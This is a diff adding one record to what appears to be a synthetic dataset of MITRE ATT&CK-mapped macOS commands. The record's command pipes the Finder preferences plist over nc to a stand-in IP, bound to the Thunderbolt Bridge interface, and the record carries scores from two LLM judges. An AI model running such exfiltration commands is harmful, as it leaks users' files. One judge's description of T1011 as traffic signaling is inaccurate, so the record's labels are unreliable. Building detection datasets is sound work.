@@ -1,0 +1,47 @@
+{
+  "technique_id": "T1011",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "cat /Users/$USER/Library/Preferences/com.apple.finder.plist | nc -s \"$(networksetup -getinfo 'Thunderbolt Bridge' | awk -F': ' '/IP address/{print $2}')\" 198.51.100.88 58231",
+  "explanation": "Transfers data by binding TCP to the Thunderbolt Bridge interface, ensuring use of an alternate medium under T1011.",
+  "rationale_steps": [
+    "Identify Thunderbolt Bridge IP via networksetup",
+    "Bind source address to that interface",
+    "Send data to an uncommon destination port"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1011-641961f7-175e537d",
+  "source_prompt_hash": "641961f7",
+  "timestamp_utc": "2025-09-30T08:21:35.084142Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed pipeline with balanced quoting and a valid macOS nc -s flag and command substitution.",
+        "semantic_score": 1,
+        "semantic_justification": "It simply streams a file over TCP while binding to the Thunderbolt Bridge source IP rather than embedding covert signals in protocol fields or timing as required by T1011 Traffic Signaling, and it also assumes that interface has an IP.",
+        "combined_score": 3.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T14:11:23.590544Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, valid command substitution, correct flags for `nc` and `networksetup` on macOS, and proper piping.",
+        "semantic_score": 5,
+        "semantic_justification": "The command accurately identifies the Thunderbolt Bridge IP and uses it as the source for `nc`, precisely fulfilling the claim of transferring data by binding TCP to that alternate interface, which is a plausible method for evading monitoring under T1011.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T14:11:47.563102Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 3.0,
+    "llm_average_score": 4.0,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
